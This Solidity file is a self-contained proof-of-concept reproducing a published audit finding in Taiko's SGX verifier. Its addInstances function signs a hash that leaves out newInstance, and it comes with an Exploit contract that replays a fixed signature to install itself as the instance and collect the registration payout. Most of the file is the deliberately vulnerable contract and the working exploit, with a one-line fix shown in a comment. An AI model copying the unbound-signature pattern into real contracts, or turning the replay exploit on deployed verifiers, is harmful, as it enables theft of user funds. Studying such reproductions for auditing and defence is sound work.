// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Taiko — addInstances() omits newInstance from the SGX signature
    (Sigma Prime, February 2024, AuditVault 35997).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: signedHash is keccak256(abi.encode("ADD_INSTANCES", extraInstances)).
    newInstance is not in that hash, so the same signature installs any address.
    The signer key is the Anvil instance 0xf39F…2266. The 65-byte signature below is
    ecrecover of that raw digest over an empty extraInstances list. It does not name
    the attacker. After the swap, the new instance claims the registration payout.
    Audited hash preserved below (@> VULN).

    Report: sigp/public-audits reports/taiko. Fix: PR 15514 hashes newInstance. */

library Terms {
    uint256 internal constant ID = 1;
    uint256 internal constant REWARD = 1000 ether;
    address internal constant SIGNER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
}

contract RewardToken {
    string public name = "Taiko";
    string public symbol = "TKO";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Reduced SGX verifier. addInstances recovers a signature that does not bind newInstance.
contract SgxVerifier {
    RewardToken public token;
    mapping(uint256 => address) public instanceOf;
    mapping(uint256 => bool) public paid;

    error SGX_INVALID_INSTANCE();

    constructor(RewardToken _token) {
        token = _token;
    }

    function seed(uint256 id, address instance) external {
        instanceOf[id] = instance;
    }

    function fund(uint256 amount) external {
        token.mint(address(this), amount);
    }

    function signedHash(address[] calldata extraInstances) public pure returns (bytes32) {
        return keccak256(abi.encode("ADD_INSTANCES", extraInstances));
    }

    function addInstances(uint256 id, address newInstance, address[] calldata extraInstances, bytes calldata signature)
        external
        returns (uint256[] memory ids)
    {
        bytes32 hash = keccak256(abi.encode("ADD_INSTANCES", extraInstances));
        address oldInstance = _recover(hash, signature);
        if (!_isInstanceValid(id, oldInstance)) revert SGX_INVALID_INSTANCE();
        // @> VULN: newInstance is not in the signed hash, so this address was not approved by the instance.
        this.writeInstance(id, newInstance);
        // FIX: keccak256(abi.encode("ADD_INSTANCES", newInstance, extraInstances))
        ids = new uint256[](extraInstances.length);
    }

    function claim(uint256 id) external returns (uint256 payout) {
        require(instanceOf[id] == msg.sender, "instance");
        require(!paid[id], "paid");
        paid[id] = true;
        payout = Terms.REWARD;
        token.transfer(msg.sender, payout);
    }

    function _isInstanceValid(uint256 id, address oldInstance) private view returns (bool) {
        return oldInstance != address(0) && instanceOf[id] == oldInstance;
    }

    function writeInstance(uint256 id, address newInstance) external {
        require(msg.sender == address(this), "self");
        instanceOf[id] = newInstance;
    }

    function _recover(bytes32 hash, bytes calldata signature) private pure returns (address) {
        require(signature.length == 65, "sig len");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(signature.offset)
            s := calldataload(add(signature.offset, 32))
            v := byte(0, calldataload(add(signature.offset, 64)))
        }
        return ecrecover(hash, v, r, s);
    }
}

contract Exploit {
    // ecrecover of keccak256(abi.encode("ADD_INSTANCES", empty address[])).
    // Signer 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266. Raw digest, no eth prefix.
    bytes constant SIG =
        hex"051f94a881bfff6c4c0ef96789596d6607c3acf8152febef4a6e7b34ea58207632fc82de8e55dcfcc249c802e1b388112f704ca661d6cf835788e0e7f01831da1b";

    RewardToken public token; // CREATE nonce 1
    SgxVerifier public verifier; // CREATE nonce 2

    uint256 public registered;
    uint256 public payout;

    constructor() {
        token = new RewardToken();
        verifier = new SgxVerifier(token);
    }

    function signature() external pure returns (bytes memory) {
        return SIG;
    }

    function run() external {
        address[] memory extras = new address[](0);
        verifier.seed(Terms.ID, Terms.SIGNER);
        verifier.fund(Terms.REWARD);
        bytes32 hash = verifier.signedHash(extras);
        require(hash == keccak256(abi.encode("ADD_INSTANCES", extras)), "hash");

        verifier.addInstances(Terms.ID, address(this), extras, SIG);

        registered = verifier.instanceOf(Terms.ID) == address(this) ? 1 : 0;
        require(registered == 1, "not registered");
        require(address(this) != Terms.SIGNER, "same as signer");

        payout = verifier.claim(Terms.ID);
        require(payout == Terms.REWARD, "payout");
        require(token.balanceOf(address(this)) == Terms.REWARD, "balance");
        require(extras.length == 0, "signer named an extra");
    }
}
